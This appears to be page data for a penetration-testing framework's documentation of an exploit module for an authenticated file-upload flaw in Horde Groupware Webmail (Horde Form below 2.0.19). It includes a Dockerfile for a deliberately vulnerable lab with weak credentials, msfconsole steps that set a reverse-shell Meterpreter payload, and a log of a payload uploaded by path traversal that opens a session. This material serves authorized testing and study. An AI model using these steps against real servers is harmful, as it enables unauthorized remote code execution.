{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/horde_form_file_upload","result":{"data":{"moduleMetadataJson":{"id":"f267f9f2-3dba-50ff-81e1-0f98c244c590","name":"Horde Form File Upload Vulnerability","fullname":"exploit/multi/http/horde_form_file_upload","description":"Horde Groupware Webmail contains a flaw that allows an authenticated remote\n          attacker to execute arbitrary PHP code. The exploitation requires the Turba\n          subcomponent to be installed.\n\n          This module was tested on Horde versions 5.2.22 and 5.2.17 running Horde Form subcomponent < 2.0.19.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/horde_form_file_upload","documentationSlug":"/modules/documentation/exploit/multi/http/horde_form_file_upload"},"documentation":{"html":"<p>Horde Groupware Webmail is a popular open-source groupware platform written in PHP. A vulnerability allows an authenticated, unprivileged user to create a malicious PHP file under the web root and gain arbitrary code execution on the server. </p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>The Horde subcomponent Horde Form &#x3C; 2.0.19 is affected. This module was specifically tested against Horde Groupware Webmail Edition 5.2.22 and 5.2.17 with Horde Form 2.0.18 installed with PEAR on Debian.</p>\n<h3 id=\"docker-install-on-ubuntu-1804\" style=\"position:relative;\"><a href=\"#docker-install-on-ubuntu-1804\" aria-label=\"docker install on ubuntu 1804 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Docker install on Ubuntu 18.04</h3>\n<p>Please folow these steps to setup a vulnerable version of Horde in Docker on a Ubuntu.</p>\n<ol>\n<li>Set up a <a href=\"http://www.ubuntu.com/\">Ubuntu</a> 18.04 box.</li>\n<li>Open a terminal, and enter: <code class=\"language-text\">sudo apt-get install docker.io</code>. Make sure Docker is properly configured and your current user has permession to use it.</li>\n<li>Enter: <code class=\"language-text\">mkdir horde_form_file_upload</code> to create a folder.</li>\n<li>Enter: <code class=\"language-text\">cd horde_form_file_upload</code> to enter that folder.</li>\n<li>Create a <code class=\"language-text\">Dockerfile</code> in it with the following content.</li>\n</ol>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">FROM debian\n\nRUN apt-get update\nRUN apt-get install --yes --no-install-recommends \\\n    apache2 \\\n    ca-certificates \\\n    dovecot-imapd \\\n    libapache2-mod-php \\\n    mysql-server \\\n    php-mysqli \\\n    php-pear \\\n    rsyslog\n\nRUN pear upgrade PEAR\nRUN pear channel-discover pear.horde.org\nRUN pear install horde/horde_role\nRUN rm -r /var/www/html/ &amp;&amp; mkdir /var/www/html/\nRUN echo /var/www/html/ | pear run-scripts horde/Horde_Role\nRUN pear install -a -B horde/webmail-5.2.22\n# Uninstall end reinstall the vulnerable version\nRUN pear uninstall -n horde/Horde_Form\nRUN pear install -a -B horde/Horde_Form-2.0.18 \nRUN sed -i &quot;/&#39;secure&#39; =&gt; &#39;tls&#39;,/d&quot; /var/www/html/imp/config/backends.php\nRUN chown -R www-data:www-data /var/www/html/\n\nRUN useradd -m -G mail user &amp;&amp; echo &#39;user:user&#39; | chpasswd\n\nRUN echo &#39;disable_plaintext_auth = no&#39; | tee /etc/dovecot/conf.d/99-auth.conf\n\nENTRYPOINT \\\n           /etc/init.d/mysql start &amp;&amp; \\\n           echo &#39;CREATE DATABASE IF NOT EXISTS horde;&#39; | mysql &amp;&amp; \\\n           echo &#39;CREATE USER IF NOT EXISTS horde;&#39; | mysql &amp;&amp; \\\n           echo &#39;GRANT ALL ON horde.* TO horde IDENTIFIED BY &quot;horde&quot;;&#39; | mysql &amp;&amp; \\\n           { echo mysqli;    sleep 0.3; \\\n             echo horde;     sleep 0.3; \\\n             echo horde;     sleep 0.3; \\\n             echo tcp;       sleep 0.3; \\\n             echo localhost; sleep 0.3; \\\n             echo;           sleep 0.3; \\\n             echo horde;     sleep 0.3; \\\n             echo;           sleep 0.3; \\\n             echo false;     sleep 0.3; \\\n             echo;           sleep 0.3; \\\n             echo 1;         sleep 0.3; } | webmail-install &amp;&amp; \\\n           dovecot &amp;&amp; \\\n           /etc/init.d/apache2 start &amp;&amp; \\\n           tail -F /var/log/apache2/access.log /var/log/syslog</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<ol start=\"6\">\n<li>Enter: <code class=\"language-text\">docker build . -t horde-img</code> to build the Docker image.</li>\n<li>Enter: <code class=\"language-text\">docker run -p8888:80 --name horde-inst horde-img</code> to run the Docker instance with the name <code class=\"language-text\">horde-inst</code>.</li>\n<li>Get the Docker host ip for reverse connection. In Linux, enter: <code class=\"language-text\">ip -4 addr show docker0 | grep -Po &#39;inet \\K[\\d.]+&#39;</code>.</li>\n</ol>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>After setting up Horde, you can use your exploit module:</p>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/multi/http/horde_form_file_upload</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS 127.0.0.1</code></li>\n<li>Do: <code class=\"language-text\">set RPORT 8888</code></li>\n<li>Do: <code class=\"language-text\">set payload php/meterpreter/reverse_tcp</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [HOST IP]</code></li>\n<li>Do: <code class=\"language-text\">set VHOST horde.lab</code></li>\n<li>Do: <code class=\"language-text\">set USERNAME user</code></li>\n<li>Do: <code class=\"language-text\">set PASSWORD user</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>And you should get a session</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"horde-groupware-webmail-edition-5222-with-horde-form-2018-on-a-debian-stretch-on-docker-running-on-an-ubuntu-1604\" style=\"position:relative;\"><a href=\"#horde-groupware-webmail-edition-5222-with-horde-form-2018-on-a-debian-stretch-on-docker-running-on-an-ubuntu-1604\" aria-label=\"horde groupware webmail edition 5222 with horde form 2018 on a debian stretch on docker running on an ubuntu 1604 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Horde Groupware Webmail Edition 5.2.22 with Horde Form 2.0.18 on a Debian stretch on Docker running on an Ubuntu 16.04</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(multi/http/horde_form_file_upload) &gt; exploit\n\n[*] Started reverse TCP handler on 172.17.0.1:4444\n[*] Uploading payload to ../var/www/html/static/mxkyfrlztogn.php\n[*] Sending stage (38247 bytes) to 172.17.0.3\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -&gt; 172.17.0.3:47720) at 2019-03-29 15:27:53 +0000\n\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f267f9f2-3dba-50ff-81e1-0f98c244c590"}}}